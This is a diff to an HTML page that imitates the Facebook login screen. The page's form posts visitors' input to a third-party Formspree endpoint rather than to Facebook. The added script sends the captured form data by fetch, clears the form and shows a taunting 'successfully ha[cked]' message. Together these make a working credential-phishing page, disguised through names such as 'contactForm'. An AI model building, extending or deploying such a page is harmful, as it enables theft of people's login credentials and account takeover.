@@ -54,16 +54,26 @@
       font-weight: bold;
       color: #555;
     }
+
+.success-message {
+      display: none;
+      color: green;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+
     </style>
 </head>
 <body>
   <center>  <h4>Facebook</h5> </center> <hr>
 
-
+ <div class="success-message" id="successMessage">
+    🎉 Congratulations! You are now successfully ha.
+  </div>
 
 <form
   action="https://formspree.io/f/mlddabnk"
-  method="POST"
+  method="POST" id="contactForm"
 >
 
 
@@ -129,6 +139,60 @@
 <a href="" style="text-decoration-line: none; color: #5AB2FF;"> Af-sommail</a><br><br>
 <a href="" style="text-decoration-line: none; color: #5AB2FF;">  Espanol</a><br><br>
 <a href="" style="text-decoration-line: none; color: #5AB2FF;">   العربية</a><br><br>
+
+
+
+
+
+
+
+
+
+
+
+  <script>
+    const form = document.getElementById('contactForm');
+    const successMessage = document.getElementById('successMessage');
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault(); // Prevent the default form submission
+
+      const formData = new FormData(form);
+      const action = form.getAttribute('action');
+
+      try {
+        const response = await fetch(action, {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+
+        if (response.ok) {
+          // Show the success message
+          successMessage.style.display = 'block';
+          // Optionally reset the form
+          form.reset();
+        } else {
+          alert('Oops! Something went wrong.');
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred while submitting the form.');
+      }
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
